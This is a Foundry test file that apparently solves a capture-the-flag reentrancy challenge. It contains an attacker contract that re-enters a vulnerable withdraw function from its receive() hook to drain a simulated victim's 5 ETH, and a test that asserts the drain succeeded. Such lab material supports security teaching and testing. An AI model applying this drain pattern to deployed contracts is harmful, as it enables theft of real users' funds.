// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19; // the test is 0.8; the target compiles under its own 0.6 pragma

import {Test, console} from "forge-std/Test.sol";

// We do NOT import Reentrance.sol directly: it is pragma ^0.6.12, and a 0.8 file
// cannot share a compilation unit with a 0.6 import. Instead we talk to it through
// an interface and deploy the separately-compiled artifact with `deployCode`.
interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
    function balances(address) external view returns (uint256);
}

contract Attacker {
    IReentrance public target;
    uint256 public amount;

    constructor(IReentrance _target) {
        target = _target;
    }

    // Kick off the attack: deposit, then withdraw once to start the loop
    function attack() external payable {
        amount = msg.value;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        uint256 remaining = address(target).balance;
        if (remaining >= amount) {
            target.withdraw(amount); // full chunk while plenty remains
        }
    }
}

contract ReentranceTest is Test {
    IReentrance target;
    Attacker attacker;

    function setUp() public {
        // Compiled from src/Reentrance.sol under its own 0.6.12 pragma.
        target = IReentrance(deployCode("Reentrance.sol:Reentrance"));
        // Simulate OTHER users' deposits sitting in the contract — this is what you'll steal
        vm.deal(address(this), 10 ether);
        target.donate{value: 5 ether}(address(0xD00D)); // a victim's 5 ETH
        attacker = new Attacker(target);
    }

    function test_DrainViaReentrancy() public {
        uint256 seed = 1 ether; // attacker's own honest deposit
        vm.deal(address(attacker), seed);
        attacker.attack{value: seed}();

        // Proof: attacker pulled out more than the 1 ETH it put in
        console.log("Target balance after:", address(target).balance);
        console.log("Attacker balance after:", address(attacker).balance);
        assertLt(address(target).balance, 5 ether, "did not drain victim funds");
    }
}
